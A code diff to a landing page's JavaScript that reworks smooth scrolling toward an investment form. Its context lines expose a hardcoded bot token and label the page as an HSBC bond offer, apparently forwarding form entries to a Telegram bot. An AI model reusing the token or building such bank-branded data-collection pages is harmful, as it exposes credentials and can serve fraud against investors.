@@ -24,6 +24,26 @@ document.addEventListener('DOMContentLoaded', function() {
             updateCarousel();
         }
     });
+
+    // scrll func
+    const scrollToForm = () => {
+        const form = document.querySelector('.investment-form');
+        form.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    };
+
+    // two buttons only
+    const headerButton = document.querySelector('header .btn-secondary');
+    const footerButton = document.querySelector('.cta .btn-primary');
+
+    headerButton.addEventListener('click', (e) => {
+        e.preventDefault();
+        scrollToForm();
+    });
+
+    footerButton.addEventListener('click', (e) => {
+        e.preventDefault();
+        scrollToForm();
+    });
     
     const form = document.querySelector('.investment-form');
     const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
@@ -103,21 +123,6 @@ From: HSBC Capital Protected Bond Landing Page
         } catch (error) {
             alert('Something went wrong. Please try again later.');
         }
-    });
-
-    
-    const scrollToForm = () => {
-        const form = document.querySelector('.investment-form');
-        form.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    };
-
-    
-    const brochureButtons = document.querySelectorAll('.btn-primary');
-    brochureButtons.forEach(button => {
-        button.addEventListener('click', (e) => {
-            e.preventDefault();
-            scrollToForm();
-        });
     });
 });
 
